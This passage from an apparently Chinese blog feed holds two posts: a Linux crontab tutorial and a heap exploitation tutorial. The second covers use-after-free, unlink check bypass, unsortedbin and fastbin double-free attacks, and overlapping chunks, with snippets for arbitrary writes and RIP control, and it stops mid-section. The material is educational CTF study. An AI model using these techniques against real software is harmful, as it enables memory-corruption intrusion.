</blockquote>
<p>然后保存并退出。不妨创建一个名为<user> cron的文件，其中<user>是用户名，例如， davecron。在该文件中加入如下的内容。</user></user></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># (put your own initials here)echo the date to the console every</div><div class="line"># 15minutes between 6pm and 6am</div><div class="line">0,15,30,45 18-06 * * * /bin/echo &apos;date&apos; &gt; /dev/console</div></pre></td></tr></table></figure>
<p>保存并退出。确信前面5个域用空格分隔。</p>
<p>在上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为cron命令的参数：</p>
<blockquote>
<p> $ crontab davecron</p>
</blockquote>
<p>现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。</p>
<p>同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)。</p>
<h5 id="2-列出crontab文件"><a href="#2-列出crontab文件" class="headerlink" title="2). 列出crontab文件"></a>2). 列出crontab文件</h5><p>   为了列出crontab文件，可以用：</p>
<blockquote>
<p>$ crontab -l</p>
<p>0,15,30,45,18-06 <em> </em> * /bin/echo <code>date</code> &gt; dev/tty1</p>
</blockquote>
<p>你将会看到和上面类似的内容。可以使用这种方法在$ H O M E目录中对crontab文件做一备份：</p>
<blockquote>
<p>\$ crontab -l &gt; $HOME/mycron</p>
</blockquote>
<p>​    这样，一旦不小心误删了crontab文件，可以用上一节所讲述的方法迅速恢复。</p>
<h5 id="3-编辑crontab文件"><a href="#3-编辑crontab文件" class="headerlink" title="3). 编辑crontab文件"></a>3). 编辑crontab文件</h5><p>   如果希望添加、删除或编辑crontab文件中的条目，而editor环境变量又设置为vi，那么就可以用vi来编辑crontab文件，相应的命令为：</p>
<blockquote>
<p>$ crontab -e</p>
</blockquote>
<p>可以像使用vi编辑其他任何文件那样修改crontab文件并退出。如果修改了某些条目或添加了新的条目，那么在保存该文件时， c r o n会对其进行必要的完整性检查。如果其中的某个域出现了超出允许范围的值，它会提示你。</p>
<p>我们在编辑crontab文件时，没准会加入新的条目。例如，加入下面的一条：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month</div><div class="line">30 3 1,7,14,21,26 * * /bin/find -name &quot;core&apos; -exec rm &#123;&#125; \;</div></pre></td></tr></table></figure>
<p>现在保存并退出。最好在crontab文件的每一个条目之上加入一条注释，这样就可以知道它的功能、运行时间，更为重要的是，知道这是哪位用户的作业。</p>
<p>现在让我们使用前面讲过的crontab -l命令列出它的全部信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ crontab -l </div><div class="line"># (crondave installed on Tue May 4 13:07:43 1999)</div><div class="line"># DT:ech the date to the console every 30 minites</div><div class="line">0,15,30,45 18-06 * * * /bin/echo date &gt; /dev/tty1</div><div class="line"># DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month</div><div class="line">30 3 1,7,14,21,26 * * /bin/find -name &quot;core&apos; -exec rm &#123;&#125; \;</div></pre></td></tr></table></figure>
<h5 id="4-删除crontab文件"><a href="#4-删除crontab文件" class="headerlink" title="4). 删除crontab文件"></a>4). 删除crontab文件</h5><p>要删除crontab文件，可以用：</p>
<blockquote>
<p>$ crontab -r</p>
</blockquote>
<h5 id="5-恢复丢失的crontab文件"><a href="#5-恢复丢失的crontab文件" class="headerlink" title="5). 恢复丢失的crontab文件"></a>5). 恢复丢失的crontab文件</h5><p>如果不小心误删了crontab文件，假设你在自己的$ H O M E目录下还有一个备份，那么可以将其拷贝到/var/spool/cron/username，其中username是用户名。如果由于权限问题无法完成拷贝，可以用：</p>
<blockquote>
<p> $ crontab filename</p>
</blockquote>
<p>​    其中，filename是你在$HOME目录中副本的文件名。</p>
<p>我建议你在自己的$HOME目录中保存一个该文件的副本。我就有过类似的经历，有数次误删了crontab文件（因为r键紧挨在e键的右边）。这就是为什么有些系统文档建议不要直接编辑crontab文件，而是编辑该文件的一个副本，然后重新提交新的文件。</p>
<p>有些crontab的变体有些怪异，所以在使用crontab命令时要格外小心。如果遗漏了任何选项，crontab可能会打开一个空文件，或者看起来像是个空文件。这时敲delete键退出，不要按\&lt;Ctrl-D>，否则你将丢失crontab文件。</p>
<h4 id="5．使用实例"><a href="#5．使用实例" class="headerlink" title="5．使用实例"></a>5．使用实例</h4><p>实例1：每1分钟执行一次command</p>
<p>命令：<code>* * * * * command</code></p>
<p>实例2：每小时的第3和第15分钟执行</p>
<p>命令：<code>3,15 * * * * command</code></p>
<p>实例3：在上午8点到11点的第3和第15分钟执行</p>
<p>命令：<code>3,15 8-11 * * * command</code></p>
<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行</p>
<p>命令：<code>3,15 8-11 */2 * * command</code></p>
<p>实例11：每一小时重启smb </p>
<p>命令：<code>* */1 * * * /etc/init.d/smb restart</code></p>
<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb </p>
<p>命令：<code>* 23-7/1 * * * /etc/init.d/smb restart</code></p>
<p>实例15：每小时执行/etc/cron.hourly目录内的脚本</p>
<p>命令：<code>01   *   *   *   *     root run-parts /etc/cron.hourly</code></p>
<p>说明：</p>
<p>run-parts这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了</p>
<h3 id="四、使用注意事项"><a href="#四、使用注意事项" class="headerlink" title="四、使用注意事项"></a>四、使用注意事项</h3><ol>
<li>注意环境变量问题</li>
</ol>
<p>有时我们创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。</p>
<p>在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。</p>
<p>不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点：</p>
<p>1）脚本中涉及文件路径时写全局路径；</p>
<p>2）脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如：</p>
<p>cat start_cbp.sh</p>
<p>#!/bin/sh</p>
<p>source /etc/profile</p>
<p>export RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf</p>
<p>/usr/local/jboss-4.0.5/bin/run.sh -c mev &amp;</p>
<p>3）当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如：</p>
<p>0 <em> </em> <em> </em> . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh</p>
<ol start="2">
<li>注意清理系统用户的邮件日志</li>
</ol>
<p>每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。</p>
<p>例如，可以在crontab文件中设置如下形式，忽略日志输出：</p>
<p>0 <em>/3 </em> <em> </em> /usr/local/apache2/apachectl restart &gt;/dev/null 2&gt;&amp;1</p>
<p>“/dev/null 2&gt;&amp;1”表示先将标准输出重定向到/dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。</p>
<ol start="3">
<li>系统级任务调度与用户级任务调度</li>
</ol>
<p>系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。</p>
<ol start="4">
<li>其他注意事项</li>
</ol>
<p>新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。</p>
<p>当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。</p>
<p>千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。</p>
<p>在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义\%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+\%Y\%m\%d’。</p>
]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆利用的方法]]></title>
      <url>/2017/11/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>在实际考虑堆利用方法时，chunk size的计算是个需要小心的地方，因为这里包括了 prev_size的复用，以及根据不同系统考虑的对齐情况，还有 chunk 的size位表示的是包括chunk header在内的size，而实际可用的size与此不同，它是减去chunk header后的大小。</p>
<p>我们还可以根据不同的条件去构造不同的chunk复用，像是只利用一个字节溢出（off-by-one）来使chunk size减小，以此来构造的poison_null_byte 漏洞等等。了解chunk复用的原理，就是去改变 size 位来使系统对错误的长度进行 malloc、free，这就是我们的目的。</p>
<p>近期做了一道题，对我的感触颇深，所以将其中用到的思想在此处进行展示：</p>
<blockquote>
<ol>
<li>堆块对堆的初始位置是没有任何限制的，也即堆块不一定要满足对其的条件。堆可以以0x6030f5开始</li>
<li>堆块大小的计算。#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))  其中~(SIZE_BITS)=0xfffffff8</li>
<li>fastbin大小计算。(((sz)&gt;&gt;(SIZE_SZ==8?4:3))-2)   在针对fastbin attack或者double free时，保证fastbin大致相同具有十分重要的意义。例如0x7f的fastbin与0x70大小的fastbin在同一条链上。因此很多时候就可以构造0x7f大小的fastbin，代替很难找到的0x71\0x70大小的fastbin</li>
<li>fastbin取值范围32位[16-80]，64位[32-160] 貌似总共有9个，实际上只能用前8个</li>
</ol>
</blockquote>
<h2 id="0×01-Use-After-Free"><a href="#0×01-Use-After-Free" class="headerlink" title="0×01 Use After Free"></a>0×01 Use After Free</h2><p>要学习堆中的漏洞，最基础不过的就是这个 UAF 了，UAF 漏洞原理很简单，就是在 free 掉 chunk 后，指向该 chunk 的指针还能正常使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">struct shell &#123;</div><div class="line">    void (*getshell)();</div><div class="line">&#125;;</div><div class="line">struct data &#123;</div><div class="line">    int data;</div><div class="line">&#125;;</div><div class="line">void test_getshell()&#123;</div><div class="line">    printf(&quot;I get the shell\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main () &#123;</div><div class="line">struct shell *p;</div><div class="line">p = (struct shell*)malloc(sizeof(struct shell));</div><div class="line"></div><div class="line">p-&gt;getshell = test_getshell;</div><div class="line">free(p);</div><div class="line">struct data *q;</div><div class="line">q = (struct data*)malloc(sizeof(struct data));</div><div class="line">q-&gt;data = 1234;</div><div class="line">p-&gt;getshell();</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译运行一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Legend: code, data, rodata, value</div><div class="line">Stopped reason: SIGSEGV</div><div class="line">0x00000000000004d2 in ?? ()</div></pre></td></tr></table></figure>
<p>我们可以看到 p 指向的函数地址被我们用1234给替换掉了，这就意味着我们能够利用这样一个漏洞控制 rip 寄存器，执行指令。</p>
<h2 id="0×02-unlink"><a href="#0×02-unlink" class="headerlink" title="0×02 unlink"></a>0×02 unlink</h2><p>unlink漏洞想必大家都不陌生，在前面我们提到过，系统通过 unlink 宏将 free chunk 从链表中取出，但是我在这里强调一下，并非所有从链表中取出 chunk 的操作都利用到了 unlink 宏，要知道，我们在 malloc 时，也多次将 chunk 从 bin 中取出，我想结合部分源码（只截取了取出部分的代码）来强调一下 unlink 的使用状况。</p>
<p><img src="/images/2017-11-17/420rc04q9ad0.png" alt=""></p>
<p><img src="/images/2017-11-17/420rc31ppb10.jpg" alt=""></p>
<p>在 malloc 操作中，我们多次进行了 bin 之间的转移，具体如下</p>
<p>victim指的是被取出的地址</p>
<ol>
<li><p>从 fastbin 中取出 chunk (fastbin后进先出)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mfastbinptr* fb = &amp;fastbin (av, idx);</div><div class="line">victim = *fb;</div><div class="line">*fb = victim-&gt;fd;</div></pre></td></tr></table></figure>
</li>
<li><p>从 unsortedbin 中取出 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">victim = unsorted_chunks(av)-&gt;bk</div><div class="line">bck = victim-&gt;bk;</div><div class="line">unsorted_chunks(av)-&gt;bk = bck;</div><div class="line">bck-&gt;fd = unsorted_chunks(av);</div></pre></td></tr></table></figure>
</li>
<li><p>从 unsortedbin 向 smallbin 转移 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if (in_smallbin_range(size)) &#123;</div><div class="line">victim_index = smallbin_index(size);</div><div class="line">bck = bin_at(av, victim_index);</div><div class="line">fwd = bck-&gt;fd;</div></pre></td></tr></table></figure>
</li>
<li><p>从 unsortedbin 向 largebin 转移 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mark_bin(av, victim_index);</div><div class="line">victim-&gt;bk = bck;</div><div class="line">victim-&gt;fd = fwd;</div><div class="line">fwd-&gt;bk = victim;</div><div class="line">bck-&gt;fd = victim;</div></pre></td></tr></table></figure>
</li>
<li><p>从 smallbin 中取出 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">idx = smallbin_index(nb);</div><div class="line">bin = bin_at(av,idx);</div><div class="line">victim = last(bin);</div><div class="line">bck = victim-&gt;bk;</div><div class="line">bin-&gt;bk = bck;</div><div class="line">bck-&gt;fd = bin;</div></pre></td></tr></table></figure>
</li>
<li><p>从 largebin 中取出 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unlink(victim, bck, fwd);</div></pre></td></tr></table></figure>
</li>
<li><p>合并 fastbin 中 chunk 并加入到 unsortedbin 中(单向链表，bk指针需要获取)</p>
<p>(这种情况比较特殊，如果实在找不到内存分配的话，可能会调用malloc_consolidate这个函数，它就会合并fastbin到unsortedbin中)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">prevsize = p-&gt;prev_size;</div><div class="line">size += prevsize;</div><div class="line">p = chunk_at_offset(p, -((long) prevsize));</div><div class="line">unlink(p, bck, fwd);</div><div class="line">......</div><div class="line">size += nextsize;</div><div class="line">unlink(nextchunk, bck, fwd);</div></pre></td></tr></table></figure>
<p>我们发现不仅仅在 free 时进行向前向后合并时使用 unlink 宏，在 malloc 时也会有零星的 unlink 使用，而且一定要注意，上面的除了6、7外，在进行取出 chunk 操作时，并没有进行 unlink，所以在对这一部分进行漏洞利用时，不需要考虑 unlink 的检查。</p>
</li>
</ol>
<p>现在言归正传，来看看 unlink 漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#define unlink(P, BK, FD) &#123;</div><div class="line">FD = P-&gt;fd;</div><div class="line">BK = P-&gt;bk;</div><div class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</div><div class="line">malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);</div><div class="line">else &#123;</div><div class="line">FD-&gt;bk = BK;</div><div class="line">BK-&gt;fd = FD;</div></pre></td></tr></table></figure>
<p>上面所示是 unlink 宏的主要实现，我们现在设想申请两个chunk，并利用第一个chunk溢出到第二个chunk的size位，将第一个chunk的 inuse 位改写为 free状态，这时候我们再free第二个chunk，此时系统通过第二个chunk的size检查第一个chunk，发现他是free状态，那么这时候就会使用unlink将第一块chunk从bin中释放出来并与第二块合并</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a = malloc(0x20)</div><div class="line">b = malloc(0x20) // b.size = 0x20 + chunk_header | inuse(0x01) == 0x31</div><div class="line">a[0x20+4] = 0x30 // 覆盖 inuse 位</div><div class="line">free(b) // 检查inuse位，发现 a 为 free，执行 unlink，合并两个 chunk</div></pre></td></tr></table></figure>
<p>这时候其实a并没有在 bin 中，但是如果我们对 a 的前两个元素（即”fd”、”bk”）进行构造，那么就可以造成任意地址写入。</p>
<p>首先我们需要绕过检查,我们进行一个小小的计算(下面的栗子是64位系统)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">P-&gt;bk-&gt;fd == P //64位 [P+0x18]+0x10 == P  &lt;=&gt;  [P+0x18] == P-0x10  &lt;=&gt;  BK == P-0x10</div><div class="line">			   //32位 [P+0xC]+0x8 == P   &lt;=&gt;   [P+0xC] == p-0x8  &lt;=&gt;  BK == P-0x8</div><div class="line">P-&gt;fd-&gt;bk == P //64位 [P+0x10]+0x18 == P  &lt;=&gt;  [P+0x10] == P-0x18  &lt;=&gt;  FD == P-0x18</div><div class="line">			   //32位 [P+0x8]+0xC == P   &lt;=&gt;   [P+0x8] == P-0xC  &lt;=&gt;  FD == P-0xC</div></pre></td></tr></table></figure>
<p>发现我们只需要在 b 的”fd”指针处放入 b-0×18,在”bk”指针处放入 b-0×10,即可绕过检查</p>
<p>执行完 unlink宏后，我们的b变成了这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">FD-&gt;bk = BK   //64 *P = P - 0x10</div><div class="line">			  //32 *p = p - 0x8</div><div class="line">BK-&gt;fd = FD   //64 *P = P - 0x18 // 这一步覆盖上一步</div><div class="line">			  //32 *p = p - 0xc</div><div class="line">计算流程：</div><div class="line">FD-&gt;bk = BK	</div><div class="line">	&lt;=&gt; (P-0x18)-&gt;bk = P-0x10</div><div class="line">	&lt;=&gt; [(P-0x18)+0x18] = P-0x10</div><div class="line">	&lt;=&gt; [P] = P-0x10</div><div class="line">	&lt;=&gt; *P = P-0x10</div><div class="line">同理，算出</div><div class="line">BK-&gt;fd = FD</div><div class="line">	&lt;=&gt; *P = P - 0x18</div></pre></td></tr></table></figure>
<p>也就是说 现在 b 处存放着 b-0×18 的地址，这时候我们再向 b 写入数据也就是向 b-0×18 处写入数据了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">--------|-------|</div><div class="line">    b   |       |----</div><div class="line">--------|-------|    |</div><div class="line">  ····· |       |    |</div><div class="line">--------|-------|    |</div><div class="line"> b-0x18 |       |&lt;---</div><div class="line">--------|-------|</div></pre></td></tr></table></figure>
<p>这时候我们通过两次写入来造成任意地址写入(假设我们能够写[b]的值，而且没有长度限制)</p>
<p>第一次写入0×18个字节，最后几位放入要写入的地址（此时覆盖了b）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">--------|-------|      |-------|</div><div class="line">    b   |address|----&gt; |  写入 |</div><div class="line">--------|-------|      |-------|</div><div class="line">  ····· |       |</div><div class="line">--------|-------|</div><div class="line"> b-0x18 | AAAA  |</div><div class="line">--------|-------|</div></pre></td></tr></table></figure>
<p>我们再次写入时，就是修改该地址处的数据了，比如修改got表什么的（此时是对上一次写入的地址进行任意修改）</p>
<h2 id="0×03-unsortedbin-attack"><a href="#0×03-unsortedbin-attack" class="headerlink" title="0×03 unsortedbin attack"></a>0×03 unsortedbin attack</h2><p>对 unsortedbin 的攻击主要利用从 unsortedbin 中取出 chunk 的操作来进行向任意位置写入一个不可控的指针,注意这里，从unsortedbin链表中取出chunk并不是使用unlink宏，所以不需要绕过 unlink 检查。首先我们需要创建两个 chunk 来避免 free 第一个 chunk 时将该 chunk 并入 top chunk(因为不连续，所以不会被合并),并且第一个 chunk 要足够大，确保其能进入到 unsortedbin中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x400)</div><div class="line">malloc(0x200)</div></pre></td></tr></table></figure>
<p>然后将 p free掉，此时 p 进入到 unsortedbin中,然后改写其的 bk 指针,并malloc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">free(p)</div><div class="line">p[1] = 0xdeadbeef-0x10 // 任意地址 - 0x10</div><div class="line">malloc(0x400)</div></pre></td></tr></table></figure>
<p>我们看一下从 unsortedbin 中取出 chunk 的操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">victim = unsorted_chunks(av)-&gt;bk // victim为free掉的p</div><div class="line">bck = victim-&gt;bk;  // bck 为 任意地址 -0x10</div><div class="line">unsorted_chunks(av)-&gt;bk = bck; // 调整链表</div><div class="line">bck-&gt;fd = unsorted_chunks(av); //  任意地址 -0x10 + 0x10 = unsortedbin</div></pre></td></tr></table></figure>
<p>这个漏洞自由度较小，不过可以用来修改一些阈值，例如更改libc中的max_fast，从而使得任意分配都使用fastbin来实现，为其他漏洞提供方便。</p>
<h2 id="0×04-fastbin-attack"><a href="#0×04-fastbin-attack" class="headerlink" title="0×04 fastbin attack"></a>0×04 fastbin attack</h2><p>还记不记得我们在第一篇中那个介绍 fastbin 中 dobule free的例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    char *a=malloc(24);</div><div class="line">    char *b=malloc(24);</div><div class="line">    free(a);</div><div class="line">    free(b);</div><div class="line">    free(a);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个运行是没有问题的，但是想象一下，这样做之后，现在的 fastbin 中是什么样子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------     -------     -------    -------</div><div class="line">| 头结点 |-&gt; |   a2  |-&gt; |   b1  |-&gt; |   a1  |-&gt;|  null |</div><div class="line"> -------     -------     -------     -------    -------</div></pre></td></tr></table></figure>
<p>其中的指向关系由chunk的 fd 指针标识。此时我们再从 fastbin中 malloc 出一个 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c = malloc(24);</div></pre></td></tr></table></figure>
<p>此时的 fastbin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------     -------     -------</div><div class="line">| 头结点 |-&gt; |   b1  |-&gt; |   a1  |-&gt; |  null |</div><div class="line"> -------     -------     -------     -------</div></pre></td></tr></table></figure>
<p>现在我们得到了一个chunk，并且这个 chunk 同时在 fastbin中也存在，那么此时如果我们修改 c 的 fd 指针位置为任意地址，那么 fastbin 中 a 的指向也会发生改变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------     -------     -------</div><div class="line">| 头结点 |-&gt; |   b1  |-&gt; |   a1  |-&gt; |任意地址|</div><div class="line"> -------     -------     -------     -------</div></pre></td></tr></table></figure>
<p>我们之后连续 malloc 两次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">malloc(24);</div><div class="line">malloc(24);</div></pre></td></tr></table></figure>
<p>现在的 fastbin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------</div><div class="line">| 头结点 |-&gt; |任意地址|</div><div class="line"> -------     -------</div></pre></td></tr></table></figure>
<p>那我们再次 malloc 时，就可以在任意地址创建一个 chunk 了，但是要注意的是，我们在之前提到过，从 fastbin 中取出 chunk 的时候会对 chunk 的size 做检查，也就是这个任意位置的 chunk 的 size 位必须构造。我们可以在栈中构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int stack = 0x30 // 24 + header = 0x28 ，0x10 对齐后 0x30</div></pre></td></tr></table></figure>
<p>这个变量作为size位，我们可以将任意地址填充为 &amp;stack – 8，然后 malloc 之后会返回这个地址的 chunk，在栈中变量无法溢出时，我们可以向 chunk 里面写入数据来造成栈溢出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">d = malloc(24);</div><div class="line">d[20] = 0xdeadbeef //控制rip, 此处的20并不是唯一的，依据具体情况而定</div></pre></td></tr></table></figure>
<p>fastbin attack 中令人兴奋的一点是，它不需要对 chunk 进行溢出就可以进行攻击，这在一些对输入长度检查严格的地方可以得到奇妙的应用。</p>
<h2 id="0×05-overlapping-chunk-1"><a href="#0×05-overlapping-chunk-1" class="headerlink" title="0×05 overlapping chunk 1"></a>0×05 overlapping chunk 1</h2><p>幸运的是，并不是所有的程序都会对输入长度有严格的约束，当我们能够溢出到下一个 chunk 时，我们可以修改它的 size 位来造成 chunk 的覆盖。</p>
<p>首先，我们创建三个chunk,考虑 prev_size 的复用和 0x10字节对齐，我们将 malloc(0x100-8), 系统会给我们(0x100-8)+0x10-0×8,即0x100(0x10对齐)的空间，实际可用的空间正好是0x100-8，并没有多分配，而要是malloc(0x100)的话，你会看到实际可用的空间是0x108（这个不是必须的，只是向大家强调一下 chunk 大小的计算）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a = malloc(0x100-8);</div><div class="line">b = malloc(0x100-8);</div><div class="line">c = malloc(0x100-8);</div></pre></td></tr></table></figure>
<p>然后 free 掉 b，b就会放到 unsortedbin 中 ，这个bin只有一个链表，并不对size进行区分，所以我们可以放入0x100的chunk，修改为size为0x180后就可以拿出0x180的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">free(b);</div></pre></td></tr></table></figure>
<p>然后我们利用a溢出到b的size位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(a+0xf8) = 0x181 // 0x01标识a为inuse状态</div></pre></td></tr></table></figure>
<p>现在我们malloc一个0×180的 chunk，系统就会将从b开始的0×180大小的空间返还，这其中包括c</p>
